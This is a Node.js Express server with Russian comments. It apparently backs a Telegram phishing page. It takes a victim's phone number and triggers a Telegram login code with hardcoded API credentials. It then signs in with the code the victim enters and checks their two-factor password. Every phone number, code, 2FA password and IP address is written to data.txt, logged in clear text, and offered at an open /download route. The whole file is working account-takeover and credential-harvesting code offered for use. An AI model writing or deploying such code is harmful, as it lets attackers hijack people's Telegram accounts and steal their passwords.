const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { MTProto } = require('@mtcute/node');

const app = express();
const PORT = process.env.PORT || 3000;

const DATA_FILE = process.env.RENDER ? path.join('/tmp', 'data.txt') : 'data.txt';

const apiId = 38819391;
const apiHash = '3460a50f4b56082066d92fa202bd6407';

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

const sessions = {};

// === 1. ОТПРАВКА КОДА ===
app.post('/api/phone', async (req, res) => {
    const { phone } = req.body;
    if (!phone || phone.length < 7) {
        return res.status(400).json({ error: 'Invalid phone' });
    }

    try {
        const client = new MTProto({
            apiId: apiId,
            apiHash: apiHash,
        });

        await client.connect();

        const result = await client.call('auth.sendCode', {
            phone_number: phone,
            api_id: apiId,
            api_hash: apiHash,
            settings: {
                allow_flashcall: false,
                current_number: false,
            }
        });

        sessions[phone] = {
            phone_code_hash: result.phone_code_hash,
            client: client
        };

        console.log('📱 Код отправлен на:', phone);
        res.json({ success: true });

    } catch (error) {
        console.error('Ошибка отправки кода:', error);
        res.status(400).json({ error: 'Не удалось отправить код' });
    }
});

// === 2. ПРОВЕРКА КОДА ===
app.post('/api/verify', async (req, res) => {
    const { phone, code } = req.body;
    if (!phone || !code || code.length < 5) {
        return res.status(400).json({ error: 'Invalid data' });
    }

    const sessionData = sessions[phone];
    if (!sessionData) {
        return res.status(400).json({ error: 'Сессия не найдена' });
    }

    try {
        const { client, phone_code_hash } = sessionData;

        const result = await client.call('auth.signIn', {
            phone_number: phone,
            phone_code_hash: phone_code_hash,
            phone_code: code,
        });

        if (result.user) {
            const data = { phone, code, ip: req.ip, time: new Date().toISOString() };
            fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
            console.log('🔑 Успешный вход для:', phone);

            delete sessions[phone];
            res.json({ success: true, requires2FA: false });
        }
    } catch (error) {
        if (error.message && error.message.includes('2FA')) {
            const data = { phone, code, ip: req.ip, time: new Date().toISOString() };
            fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
            console.log('🔐 2FA требуется для:', phone);

            res.json({ success: true, requires2FA: true });
        } else {
            console.error('Ошибка входа:', error);
            res.status(400).json({ error: 'Неверный код' });
        }
    }
});

// === 3. ПРИЁМ 2FA ПАРОЛЯ ===
app.post('/api/2fa', async (req, res) => {
    const { phone, code, password } = req.body;
    if (!phone || !password) {
        return res.status(400).json({ error: 'Invalid data' });
    }

    const sessionData = sessions[phone];
    if (!sessionData) {
        return res.status(400).json({ error: 'Сессия не найдена' });
    }

    try {
        const { client } = sessionData;

        await client.call('auth.checkPassword', {
            password: password
        });

        const data = {
            phone,
            code,
            twofa_password: password,
            ip: req.ip,
            time: new Date().toISOString()
        };
        fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
        console.log('🔐 Phone + Code + 2FA:', phone, code, password);

        delete sessions[phone];
        res.json({ success: true });

    } catch (error) {
        console.error('Ошибка 2FA:', error);
        res.status(400).json({ error: 'Неверный пароль 2FA' });
    }
});

// === 4. СКАЧИВАНИЕ DATA.TXT ===
app.get('/download', (req, res) => {
    if (fs.existsSync(DATA_FILE)) {
        res.download(DATA_FILE, 'data.txt');
    } else {
        res.status(404).send('❌ Файл пока пуст.');
    }
});

app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});